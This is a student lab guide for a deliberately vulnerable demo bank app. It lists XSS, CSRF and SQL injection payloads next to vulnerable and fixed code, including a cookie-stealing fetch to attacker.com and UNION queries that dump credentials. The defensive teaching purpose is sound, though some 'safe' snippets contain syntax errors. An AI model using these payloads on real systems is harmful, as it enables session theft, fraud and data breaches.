# 🎤 SentinelBank — Viva & Report Guide

> Complete copy-pasteable payloads and line-by-line code explanations for your IS2 assignment submission and live viva.

---

## Table of Contents

1. [XSS — Reflected](#1-xss--reflected-25-marks)
2. [XSS — Stored](#2-xss--stored)
3. [XSS — DOM-Based](#3-xss--dom-based)
4. [CSRF](#4-csrf-15-marks)
5. [SQL Injection — Easy (Auth Bypass)](#5-sql-injection--easy-login-bypass-30-marks)
6. [SQL Injection — Intermediate (Blind Boolean & Error-Based)](#6-sql-injection--intermediate-blind-boolean--error-based)
7. [SQL Injection — Advanced (UNION 4-Stage Chain)](#7-sql-injection--advanced-union-4-stage-attack-chain)
8. [Code Explanations for Viva](#8-code-explanations-for-viva)

---

## 1. XSS — Reflected (25 Marks)

### Feature
**Payee & Transaction Search** — Users search for payees by name/username. The search query is reflected back in the results banner.

### Vulnerable Mode Payload
Navigate to the **Search Payee** section and enter:

```
<img src=x onerror=alert('Reflected_XSS_Executed')>
```

Or for `<script>` tag execution:

```
<script>alert('Reflected_XSS')</script>
```

Or to steal cookies:

```
<svg onload=alert(document.cookie)>
```

### Expected Result — Vulnerable Mode
- ✅ The `alert()` dialog box pops up immediately
- ✅ The payload is reflected raw in the "Search results for:" banner
- ✅ The Developer Query Log shows the unsanitized query

### Expected Result — Safe Mode
- ✅ No alert dialog — the payload appears as **harmless literal text**: `&lt;img src=x onerror=alert(&#x27;Reflected_XSS_Executed&#x27;)&gt;`
- ✅ The server returns HTML-encoded output
- ✅ The client renders using `textContent` instead of `innerHTML`
- ✅ `Content-Security-Policy` header blocks inline scripts

### Vulnerable Code (`backend/routes/vulnerable.js`)
```javascript
// ⚠️ VULNERABLE: q is embedded raw into HTML — reflected XSS
const html = `<p>Search results for: <strong>${q}</strong></p>`;
```

### Safe Code (`backend/routes/safe.js`)
```javascript
// ✅ SAFE: HTML-encode output, sanitize input
const safeQ = sanitizeInput(q, 100);
const encodedQ = escapeHTML(safeQ);
const html = `<p>Search results for: <strong>${encodedQ}</strong></p>`;
```

### Client-Side Difference
```javascript
// VULNERABLE: innerHTML — executes injected HTML/JS
container.innerHTML = data.html;

// SAFE: textContent — treats everything as plain text
container.textContent = '';
const p = document.createElement('p');
p.innerHTML = `Search results for: <strong>${escH(data.query)}</strong>`;
container.appendChild(p);
```

---

## 2. XSS — Stored

### Feature
**Customer Feedback Wall** — Users post public reviews that are stored in the `feedback_reviews` database table and displayed to all users.

### Vulnerable Mode Payload
Go to the **Reviews** section, type this in the comment box, and click Submit:

```
<img src=x onerror=alert('Stored_XSS_Executed')>
```

Or:

```
<script>alert('Stored_XSS')</script>
```

Or (cookie theft):

```
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

### Expected Result — Vulnerable Mode
- ✅ The review is saved to the database containing raw HTML/JS
- ✅ Every time ANY user loads the Reviews page, the `alert()` fires
- ✅ The malicious script is rendered via `innerHTML` and executes

### Expected Result — Safe Mode
- ✅ The payload is HTML-encoded before storage: `&lt;script&gt;alert(&#x27;Stored_XSS&#x27;)&lt;/script&gt;`
- ✅ It displays as harmless literal text in the reviews list
- ✅ No alert dialog fires
- ✅ The client renders using `textContent`

### Vulnerable Code
```javascript
// ⚠️ VULNERABLE: Comment is stored raw in the database (no HTML encoding)
await db.query(
  'INSERT INTO feedback_reviews (author, rating, comment, ...) VALUES ($1, $2, $3, $4)',
  [author, rating, comment, created_at]  // comment contains raw HTML/JS
);

// ⚠️ VULNERABLE: Retrieved and sent to client without encoding
const result = await db.query('SELECT * FROM feedback_reviews ORDER BY id DESC');
res.json({ reviews: result.rows });  // raw HTML in comment field
```

### Safe Code
```javascript
// ✅ SAFE: HTML-encode BEFORE storage
const safeComment = escapeHTML(comment || '');
await db.query('INSERT INTO feedback_reviews ... VALUES ($1, $2, $3, $4)',
  [author, safeRating, safeComment, created_at]
);

// ✅ SAFE: Also HTML-encode on output (defense in depth)
const safeReviews = result.rows.map(r => ({
  ...r,
  comment: escapeHTML(r.comment),
}));
```

---

## 3. XSS — DOM-Based

### Feature
**Promo / Referral Banner** — A widget on the dashboard reads `window.location.hash` to display promotional messages. This is entirely client-side; the payload never reaches the server.

### Vulnerable Mode Payload
While on the dashboard in Vulnerable mode, change the URL to:

```
http://localhost:5000/#promo=<img src=x onerror=alert('DOM_XSS_Triggered')>
```

Or:

```
http://localhost:5000/#promo=<svg onload=alert('DOM_XSS')>
```

### Expected Result — Vulnerable Mode
- ✅ The alert dialog pops up immediately
- ✅ The promo banner displays the injected HTML
- ✅ No server request was made — this is pure client-side XSS

### Expected Result — Safe Mode
- ✅ No alert dialog
- ✅ The banner shows: "Welcome to SentinelBank! Invalid or unrecognized promo code."
- ✅ Input is validated against an allowlist of known promo codes
- ✅ Content is rendered using `textContent`

### Vulnerable Code (Client JS)
```javascript
// ⚠️ VULNERABLE: innerHTML from URL hash — arbitrary HTML/JS executes
const decoded = decodeURIComponent(hash.substring(1));
const params = new URLSearchParams(decoded);
const promoValue = params.get('promo') || decoded;
banner.innerHTML = `🎉 Promo: ${promoValue}`;
```

### Safe Code (Client JS)
```javascript
// ✅ SAFE: Validate against allowlist, use textContent
const allowed = ['welcome', 'sentinel2026', 'diwali2026', 'newyear2027', 'premium', 'vip'];
if (allowed.includes(promoValue.toLowerCase())) {
  banner.textContent = `🎉 Active Promo: ${promoValue}`;
} else {
  banner.textContent = '🎉 Welcome to SentinelBank! Invalid or unrecognized promo code.';
}
```

---

## 4. CSRF (15 Marks)

### Feature
**Instant Wire Transfer & Email Update** — State-changing `POST` endpoints authenticated via session cookies.

### Setup
1. Open `http://localhost:5000` and log in as **alice** (password: `AliceBank123`) in **Vulnerable Mode**
2. Note alice's balance ($42,500) and email (alice.johnson@email.com)
3. In a new tab, open the attacker page: `http://localhost:5500/csrf-exploit.html`
4. Click **"Claim Free Cashback Reward"** on the attacker page

### Attacker Page HTML Payload
```html
<!-- Hidden form auto-submitting to vulnerable transfer endpoint -->
<form action="http://localhost:5000/api/vulnerable/transfer"
      method="POST" target="csrf-frame">
  <input type="hidden" name="recipient" value="bob">
  <input type="hidden" name="amount" value="5000">
  <input type="hidden" name="note" value="Cashback Reward Processing">
</form>

<!-- Hidden form for email change -->
<form action="http://localhost:5000/api/vulnerable/update-email"
      method="POST" target="csrf-frame">
  <input type="hidden" name="newEmail" value="attacker-pwned@evil.com">
</form>
```

### Expected Result — Vulnerable Mode
- ✅ $5,000 is silently transferred from alice's account to bob
- ✅ Alice's email is changed to `attacker-pwned@evil.com`
- ✅ Alice sees none of this — she only sees the fake "Cashback Reward Claimed" message
- ✅ Go back to SentinelBank and refresh — balance has dropped, email has changed

### Expected Result — Safe Mode
- ✅ The attacker page's forms target `/api/safe/transfer` and fail
- ✅ Response: **`403 Forbidden: Invalid or Missing CSRF Token`**
- ✅ No transfer occurs, no email changes
- ✅ The safe endpoint requires a valid `X-CSRF-Token` header that the attacker cannot know

### Vulnerable Code
```javascript
// ⚠️ VULNERABLE: No CSRF token check, no origin validation
router.post('/transfer', requireAuth, async (req, res) => {
  // Directly processes the transfer using session cookie alone
  const { recipient, amount, note } = req.body;
  // ... executes transfer ...
});
```

### Safe Code
```javascript
// ✅ SAFE: CSRF Synchronizer Token + Origin validation
function csrfProtect(req, res, next) {
  const token = req.headers['x-csrf-token'] || req.body?._csrf;
  if (!token || token !== session.csrfToken) {
    return res.status(403).json({
      message: '403 Forbidden: Invalid or Missing CSRF Token'
    });
  }
  // Also validate Origin header
  const origin = req.headers.origin;
  if (origin && !origin.startsWith('http://localhost:5000')) {
    return res.status(403).json({ message: '403 Forbidden: Origin validation failed' });
  }
  next();
}

router.post('/transfer', csrfProtect, async (req, res) => { ... });
```

---

## 5. SQL Injection — Easy: Login Bypass (30 Marks)

### Feature
**Login Authentication** — Username and password checked against the `users` table.

### Vulnerable Mode Payloads

**Payload 1 — Admin bypass:**
```
Username: admin' --
Password: anything
```

**Payload 2 — Universal bypass:**
```
Username: ' OR '1'='1' --
Password: anything
```

### Expected Result — Vulnerable Mode
- ✅ Logs in as `System Administrator` with $950,000 balance
- ✅ The Developer Query Log shows:
  ```sql
  SELECT id, username, full_name, email, role, balance
  FROM users WHERE username = 'admin' --' AND password = 'anything'
  ```
  The `--` comments out the password check entirely.

### Expected Result — Safe Mode
- ✅ Login fails with "Invalid username or password."
- ✅ The `admin' --` is treated as a literal string (no user with that username exists)
- ✅ The Developer Query Log shows the parameterized query

### Vulnerable Code
```javascript
// ⚠️ VULNERABLE: String concatenation — classic SQL injection
const query = `SELECT id, username, full_name, email, role, balance
  FROM users WHERE username = '${username}' AND password = '${password}'`;
const result = await db.query(query);
```

### Safe Code
```javascript
// ✅ SAFE: Parameterized query — $1, $2 are bound parameters
const query = 'SELECT id, username, full_name, email, role, balance
  FROM users WHERE username = $1 AND password = $2';
const result = await db.query(query, [username, password]);
```

---

## 6. SQL Injection — Intermediate: Blind Boolean & Error-Based

### Feature
**Account Verification / VIP Eligibility** — Checks if a username exists and returns "Active" or "Not Found".

### Vulnerable Mode Payloads

**Blind Boolean — TRUE test** (admin's password starts with 'S'):
```
admin' AND SUBSTRING(password, 1, 1) = 'S' --
```
→ Returns: **✅ Account Active & Verified** (TRUE — the condition matches)

**Blind Boolean — FALSE test:**
```
admin' AND SUBSTRING(password, 1, 1) = 'Z' --
```
→ Returns: **❌ Account Not Found** (FALSE — the condition doesn't match)

**Extracting more characters:**
```
admin' AND SUBSTRING(password, 1, 5) = 'Super' --
```
→ Returns: **✅ Account Active & Verified** (confirms first 5 chars)

**Error-Based Extraction** (full password leaked in error message):
```
admin' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS INT) --
```
→ Returns: **Database Error: invalid input syntax for type integer: "SuperSecretAdmin#2026"**

### Expected Result — Safe Mode
- ✅ ALL payloads return **❌ Account Not Found** (treated as literal username strings)
- ✅ Error-based payload returns generic "An internal error occurred" (no DB details leaked)

### Vulnerable Code
```javascript
// ⚠️ VULNERABLE: String concatenation + raw error messages
const query = `SELECT username, role FROM users WHERE username = '${username}'`;
// ... exposes err.message in response (enables error-based extraction)
```

### Safe Code
```javascript
// ✅ SAFE: Parameterized query + generic error messages
const query = 'SELECT username, role FROM users WHERE username = $1';
const result = await db.query(query, [username]);
// On error: "An internal error occurred." (no DB details)
```

---

## 7. SQL Injection — Advanced: UNION 4-Stage Attack Chain

### Feature
**Staff Directory Search** — Displays a 4-column table (staff_code, full_name, department, contact_email). All columns are TEXT for UNION compatibility.

### Stage 1: Column Enumeration

**Payload (succeeds — confirms 4 columns):**
```
%' ORDER BY 4 --
```

**Payload (fails — proves there's no 5th column):**
```
%' ORDER BY 5 --
```

**Payload (alternative — direct confirm):**
```
%' UNION SELECT '1','2','3','4' --
```
→ Result table shows a row with values `1, 2, 3, 4`

### Stage 2: Extract Database/Table Names via `information_schema`

**Payload:**
```
%' UNION SELECT table_schema, table_name, table_type, '4' FROM information_schema.tables WHERE table_schema = 'public' --
```

→ Result table reveals all 5 application tables:
| Column 1 | Column 2 | Column 3 | Column 4 |
|---|---|---|---|
| public | users | BASE TABLE | 4 |
| public | staff_directory | BASE TABLE | 4 |
| public | transactions | BASE TABLE | 4 |
| public | feedback_reviews | BASE TABLE | 4 |
| public | **audit_secrets** | BASE TABLE | 4 |

### Stage 3: Extract Column Names of Target Table

**Payload (users table):**
```
%' UNION SELECT table_name, column_name, data_type, '4' FROM information_schema.columns WHERE table_name = 'users' --
```

→ Reveals columns: `id, username, password, full_name, email, role, balance`

**Payload (audit_secrets table):**
```
%' UNION SELECT table_name, column_name, data_type, '4' FROM information_schema.columns WHERE table_name = 'audit_secrets' --
```

→ Reveals columns: `secret_id, vault_key, recovery_pin`

### Stage 4: Dump Sensitive Data

**Payload (all user credentials + balances):**
```
%' UNION SELECT username, password, email, role || ' ($' || balance::text || ')' FROM users --
```

→ Full credential dump:
| staff_code | full_name | department | contact_email |
|---|---|---|---|
| admin | SuperSecretAdmin#2026 | admin@sentinelbank.com | administrator ($950000) |
| alice | AliceBank123 | alice.johnson@email.com | premium_customer ($42500) |
| bob | BobSecure99 | bob.williams@email.com | customer ($18200) |
| ... | ... | ... | ... |

**Payload (dump audit secrets):**
```
%' UNION SELECT secret_id, vault_key, recovery_pin, 'LEAKED' FROM audit_secrets --
```

→ Exposes vault keys and recovery PINs!

### Expected Result — Safe Mode
- ✅ All UNION payloads return **0 rows** (the payload is treated as a literal search string)
- ✅ Normal department searches (e.g., "Technology") work normally
- ✅ The query log shows the payload being passed as a parameter value, not injected into SQL

### Vulnerable Code
```javascript
// ⚠️ VULNERABLE: String concatenation in LIKE clause
const query = `SELECT staff_code, full_name, department, contact_email
  FROM staff_directory WHERE department LIKE '%${dept}%'`;
const result = await db.query(query);
```

### Safe Code
```javascript
// ✅ SAFE: Parameterized LIKE — the entire payload becomes a literal search string
const query = 'SELECT staff_code, full_name, department, contact_email
  FROM staff_directory WHERE department LIKE $1';
const result = await db.query(query, [`%${dept}%`]);
```

---

## 8. Code Explanations for Viva

### Q: Why is string concatenation dangerous in SQL?
**A:** When user input is directly concatenated into a SQL string, the database cannot distinguish between the query structure and user data. An attacker can inject SQL syntax (like `' OR '1'='1' --`) that modifies the query's logic. Parameterized queries solve this by sending the query structure and data separately — the database treats parameters as literal values, never as SQL code.

### Q: What is the difference between Reflected and Stored XSS?
**A:** In **Reflected XSS**, the malicious script is part of the HTTP request (e.g., a URL query parameter) and reflected back in the response. It requires tricking a victim into clicking a malicious link. In **Stored XSS**, the script is permanently saved in the database and executes every time any user loads the affected page — it's more dangerous because it doesn't require user interaction after the initial injection.

### Q: What is DOM-Based XSS and how is it different?
**A:** DOM-Based XSS occurs entirely in the client's browser. The malicious data (from `location.hash`, `location.search`, `document.referrer`, etc.) never reaches the server. The vulnerability is in the client-side JavaScript that reads untrusted data and inserts it into the DOM using unsafe sinks like `innerHTML`. The fix is to validate input against an allowlist and use safe sinks like `textContent`.

### Q: How does CSRF work and why do tokens prevent it?
**A:** CSRF exploits the browser's automatic cookie attachment. When a victim visits an attacker's page while logged into a target site, the attacker's page can submit forms/requests to the target site. The browser automatically attaches the session cookie, making the request appear legitimate. **CSRF tokens** prevent this because the attacker cannot read the token (due to Same-Origin Policy) and therefore cannot include it in their forged request.

### Q: Why do both localhost:5000 and localhost:5500 share cookies?
**A:** Cookies use the `SameSite` attribute based on the "site" concept (scheme + registrable domain). Both `localhost:5000` and `localhost:5500` share the same registrable domain (`localhost`), making them "same-site." This means `SameSite=Lax` cookies ARE sent between them, which is why the CSRF demo works. In production, the attacker would be on a different domain, but `SameSite=Lax` alone wouldn't be sufficient defense — CSRF tokens remain the primary protection.

### Q: What does the `escapeHTML()` function do?
**A:** It converts the 5 dangerous HTML characters into their entity equivalents:
- `&` → `&amp;`
- `<` → `&lt;`
- `>` → `&gt;`
- `"` → `&quot;`
- `'` → `&#x27;`

This ensures that any HTML/JavaScript in user input is rendered as **literal text** by the browser, preventing script execution.

### Q: What is `information_schema` and why is it important for SQLi?
**A:** `information_schema` is a standard SQL metadata schema available in all PostgreSQL databases. It contains views like `information_schema.tables` (all table names) and `information_schema.columns` (all column names, types). In a SQL injection attack, it allows an attacker to **discover the database structure** — finding table names, column names, and data types — before dumping sensitive data. This is why the 4-stage UNION attack chain is so powerful.

### Q: What is the Content-Security-Policy header?
**A:** CSP is an HTTP response header that tells the browser which sources of content are allowed to load and execute. Our safe mode sets `script-src 'self'`, which means only scripts from the same origin (localhost:5000) can run — inline scripts, `eval()`, and scripts from other domains are blocked. This provides defense-in-depth against XSS even if an encoding mistake allows injection.

---

## 📋 Quick Reference — All Payloads at a Glance

| # | Attack | Payload |
|---|---|---|
| 1 | Reflected XSS | `<img src=x onerror=alert('Reflected_XSS_Executed')>` |
| 2 | Stored XSS | `<img src=x onerror=alert('Stored_XSS_Executed')>` |
| 3 | DOM-Based XSS | `http://localhost:5000/#promo=<img src=x onerror=alert('DOM_XSS_Triggered')>` |
| 4 | CSRF | Visit `http://localhost:5500/csrf-exploit.html` while logged in |
| 5 | SQLi Easy | Username: `admin' --` Password: `anything` |
| 6a | SQLi Blind TRUE | `admin' AND SUBSTRING(password, 1, 1) = 'S' --` |
| 6b | SQLi Blind FALSE | `admin' AND SUBSTRING(password, 1, 1) = 'Z' --` |
| 6c | SQLi Error-Based | `admin' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS INT) --` |
| 7a | SQLi UNION Stage 1 | `%' ORDER BY 4 --` |
| 7b | SQLi UNION Stage 2 | `%' UNION SELECT table_schema, table_name, table_type, '4' FROM information_schema.tables WHERE table_schema = 'public' --` |
| 7c | SQLi UNION Stage 3 | `%' UNION SELECT table_name, column_name, data_type, '4' FROM information_schema.columns WHERE table_name = 'users' --` |
| 7d | SQLi UNION Stage 4 | `%' UNION SELECT username, password, email, role \|\| ' (\$' \|\| balance::text \|\| ')' FROM users --` |

